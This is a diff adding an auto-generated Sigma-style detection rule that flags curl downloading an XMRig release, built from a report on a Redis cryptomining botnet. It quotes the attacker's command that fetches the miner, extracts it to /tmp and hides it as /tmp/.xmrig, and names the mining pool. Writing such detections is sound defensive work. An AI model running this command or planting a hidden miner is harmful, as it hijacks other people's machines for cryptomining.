@@ -1,0 +1,40 @@
+title: 'Command the source shows being run: curl https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-sta'
+id: be35a118-6732-474c-9ea4-24e765777641
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "curl -sLk ''https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz''
+  -o /tmp/x.tgz tar xzf /tmp/x.tgz -C /tmp/ mv /tmp/xmrig-*/xmrig /tmp/.xmrig".'
+references:
+- https://hunt.io/blog/redis-cryptomining-botnet-3562-servers
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-03'
+tags: []
+logsource:
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: /curl
+    CommandLine|contains: https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hecate_provenance:
+- value: github.com/xmrig/xmrig
+  type: url
+  role: download
+  status: active
+  confidence: unknown
+  source: https://hunt.io/blog/redis-cryptomining-botnet-3562-servers
+  evidence: '...pulls the XMRig release tarball straight from github.com/xmrig/xmrig, and points the resulting
+    hidden /tmp/.xmrig binary at pool.moneroocean.stream:443 over TLS.'
+- value: https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+  type: url
+  role: download
+  status: active
+  confidence: unknown
+  source: https://hunt.io/blog/redis-cryptomining-botnet-3562-servers
+  evidence: The payload grabs a legitimate, unmodified XMRig release straight off the official GitHub
+    releases page rather than bundling a pre-built or trojanized binary, which both keeps the operator's
+    own hosti
+hunt_id: H-0618
